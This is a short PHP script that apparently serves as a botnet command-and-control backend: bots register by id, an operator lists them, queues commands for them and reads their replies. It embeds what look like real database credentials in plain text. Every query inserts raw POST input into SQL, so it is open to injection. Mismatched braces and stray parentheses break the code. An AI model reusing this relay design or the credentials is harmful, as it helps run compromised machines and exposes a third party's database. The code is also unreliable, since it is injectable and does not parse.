<?php
$dbconn = pg_connect("
	host     = ec2-54-235-89-113.compute-1.amazonaws.com
	dbname   = d4vrdl5cj9rncb
	user     = malouijarvdhsq
	password = tXOJrWYUOh-BTc-nQ5KxRa1V_N
")or die('Could not connect: ' . pg_last_error());

$query = "CREATE TABLE clients (
	id        TEXT    NOT NULL,
	response  TEXT    NOT NULL,
	request   TEXT    NOT NULL)";
$result = pg_query($query) or die(pg_last_error());
			
switch ($_POST["comand"])
{
    case "set_bot": 
    {
        if(isset($_POST['id']))
        {
			$query = "SELECT * FROM clients WHERE id = '$_POST[id])'";
			$result = pg_query($query) or die(pg_last_error());
			if(pg_num_rows($result) == 0)
			{
				$query = "INSERT INTO clients (id, response, request) VALUES ('$_POST[id]', '', '')";
			}
			$result = pg_query($query) or die(pg_last_error());
			echo "true";
		}
    } break;
	
    case "get_bots": 
    {
		$query = "SELECT * FROM clients";
		$result = pg_query($query) or die(pg_last_error());
		$text = "";
		while ($line = pg_fetch_array($result, null, PGSQL_ASSOC)) 
		{
			$text = $text . $line['id'] . "|";
		}
		echo $text;
    } break;
	
	case "set_request": 
    {
        if(isset($_POST['request']) and isset($_POST['id']))
        {
			$query = "UPDATE clients SET request = '$_POST[request]' WHERE id = '$_POST[id])'";
			$result = pg_query($query) or die(pg_last_error());
		}
    } break;
	
	case "get_request": 
    {
        if(isset($_POST['id']))
        {
			$query = "SELECT * FROM clients WHERE id = '$_POST[id]'";
			$result = pg_query($query) or die(pg_last_error());
			while ($line = pg_fetch_array($result, null, PGSQL_ASSOC)) 
			{
				echo $line['request'];
			}
		{
    } break;
	
	case "set_response": 
    {
        if(isset($_POST['response']) and isset($_POST['id']))
        {
			$query = "UPDATE clients SET response = '$_POST[response]' WHERE id = '$_POST[id])'";
			$result = pg_query($query) or die(pg_last_error());
		}
    } break;
	
	case "get_response": 
    {
        if(isset($_POST['id']))
        {
			$query = "SELECT * FROM clients WHERE id = '$_POST[id]'";
			$result = pg_query($query) or die(pg_last_error());
			while ($line = pg_fetch_array($result, null, PGSQL_ASSOC)) 
			{
				echo $line['response'];
			}
		{
    } break;
}
pg_free_result($result);
pg_close($dbconn);
?>
